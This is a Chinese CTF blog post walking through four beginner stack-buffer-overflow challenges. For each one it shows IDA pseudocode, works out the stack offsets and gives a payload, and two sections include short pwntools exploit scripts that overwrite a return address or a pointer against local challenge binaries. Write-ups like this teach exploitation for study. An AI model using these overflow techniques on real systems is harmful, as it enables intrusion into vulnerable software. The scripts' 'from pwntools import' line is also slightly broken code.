---
title: pwn_stack
date: 2019-08-27 11:13:10
tags: [pwn]
categories: [pwn]
copyright: true
description: <center>几道基础pwn栈溢出问题</center>
photo: "http://r.photo.store.qq.com/psb?/V13BnVsC23MbK8/z2I86fOkmMyHc4kIxJYWKJETZ0DpDVeqYGLvpIm*bjs!/r/dFMBAAAAAAAA"
---
---

# Doubly Dangerous

扔进IDA，F5查看伪代码，我们看到main函数里有两个变量，一个数组和一个单精度浮点数，一个gets函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-4Ch]
  float v5; // [esp+4Ch] [ebp-Ch]

  v5 = 0.0;
  puts("Give me a string: ");
  gets(&s);
  if ( 11.28125 == v5 )
  {
    puts("Success! Here is your flag:");
    give_flag();
  }
  else
  {
    puts("nope!");
  }
  return 0;
}
```

分析代码易知当v5等于11.28125时，就会调用`give_flag`函数，然后得到flag。于是我们的思路就是通过gets函数，使数组`s`的值覆盖掉v5的值，使v5等于11.28125。
那么通过IDA远程调试，断点就设置在main函数即可，然后单步调试，观察栈中的情况，我们发现v5最开始被赋值为零，记录下v5在栈中的位置：

{% asset_img dd.png %}

继续执行，找到数组`s`在栈中的位置：

{% asset_img dd1.png %}

我们要做的，就是在s中填充适当字符，覆盖掉v5为我们想要的。于是这两个栈中的地址相减，得到两者相距64个字节，那么就需要64个字节的字符填充，然后后4字节覆盖v5成11.28125。由计算机组成原理的知识，32位系统，小端，float型数据，得到11.28125的机器码为`0x41348000`，于是构造payload：`64*'a'+'\x00\x80\x34\x41'`

通过pwntools最终得到flag:

{% asset_img dd3.png %}

---

# Quals-Warmup

扔进IDA，查看伪代码

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s; // [rsp+0h] [rbp-80h]
  char v5; // [rsp+40h] [rbp-40h]

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(&s, "%p\n", sub_40060D);
  write(1, &s, 9uLL);
  write(1, ">", 1uLL);
  return gets(&v5, ">");
}
```

查看`sub_40060D`

```c
int sub_40060D()
{
  return system("cat flag.txt");
}
```

分析代码可知，这个程序其实运行的时候，就已经把得到flag的函数地址打印出来了，所以要做的就是栈溢出，使返回值变为`sub_40060D`。然后查看v5在栈中的位置，使`RBP-40H`，所以保存的返回地址的起始在栈中的地址为`RBP-40H-8H(RBP旧值)-8H`，那么payload构造为`payload = 72*'a'+p64(0x40060d)`即可。通过pwntools得到flag:

{% asset_img qw.png %}

---

# sCTF 2016 q1-pwn1

扔进IDA，分析伪代码，发现main函数很简单，只调用了一个`vuln`函数，进入这个函数分析：

```c
int vuln()
{
  int v0; // ST08_4
  const char *v1; // eax
  char s; // [esp+1Ch] [ebp-3Ch]
  char v4; // [esp+3Ch] [ebp-1Ch]
  char v5; // [esp+40h] [ebp-18h]
  char v6; // [esp+47h] [ebp-11h]
  char v7; // [esp+48h] [ebp-10h]
  char v8; // [esp+4Fh] [ebp-9h]

  printf("Tell me something about yourself: ");
  fgets(&s, 32, edata);
  std::string::operator=(&input, &s);
  std::allocator<char>::allocator(&v6);
  std::string::string(&v5, "you", &v6);
  std::allocator<char>::allocator(&v8);
  std::string::string(&v7, "I", &v8);
  replace((std::string *)&v4, (std::string *)&input, (std::string *)&v7);
  std::string::operator=(&input, &v4, v0, &v5);
  std::string::~string((std::string *)&v4);
  std::string::~string((std::string *)&v7);
  std::allocator<char>::~allocator(&v8);
  std::string::~string((std::string *)&v5);
  std::allocator<char>::~allocator(&v6);
  v1 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(&s, v1);
  return printf("So, %s\n", &s);
}
```

分析代码加上运行这个程序，可以知道是返回输入，然后看代码中`v5`是`you`，`v7`是`I`，然后有个`replace`函数，猜测是将输入中的`I`全部替换为`you`，测试一下，发现确实是。然后看输入的s，距离`ebp`有`3C`，然而fgets允许输入的最长字符串为32，所以不可能通过直接输入导致栈溢出。我们看到代码的最后，有个`strcpy`函数，分析可知，是将替换后的字符串给了v1，然后将v1拷贝到s中，于是乎，我们的目标就是通过替换后的字符串，使栈溢出。所以我们需要输入21个`I`，然后再任意输入一个字符作为payload的占位部分，然后加上`get_flag`的地址。exp如下：

```python
from pwntools import *

io = process('./pwn1')

io.recv()

payload = 'I'*21+'a'+p32(0x08048f0d)

io.sendline(payload)

print io.recv()
```

---

# just_do_it

扔入IDA中，分析代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+8h] [ebp-20h]
  FILE *stream; // [esp+18h] [ebp-10h]
  char *v6; // [esp+1Ch] [ebp-Ch]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  v6 = failed_message;
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  if ( !fgets(&s, 32, stdin) )
  {
    perror("input error.\n");
    exit(0);
  }
  if ( !strcmp(&s, PASSWORD) )
    v6 = success_message;
  puts(v6);
  return 0;
}
```

发现代码是让你输入密码，查看`success_message`，发现就是一个输入成功的字符串，而不是flag。从代码中可以看到，代码使用fgets读取flag，保存到全局变量flag中。我们输入是在s，但是s距离`ebp`有`20H`，而fgets只允许有32个字符的输入，明显不能直接栈溢出。于是继续分析。我们发现最终输出了v6，v6距离s只有20个字符，于是我们可以覆盖v6为flag的地址，通过puts打印出flag。exp如下:

```python
from pwntools import *

io = process('./just_do_it')

io.recv()

payload = 'a'*20 + p32(0x0804A080)

io.sendline(payload)

io.recv()
```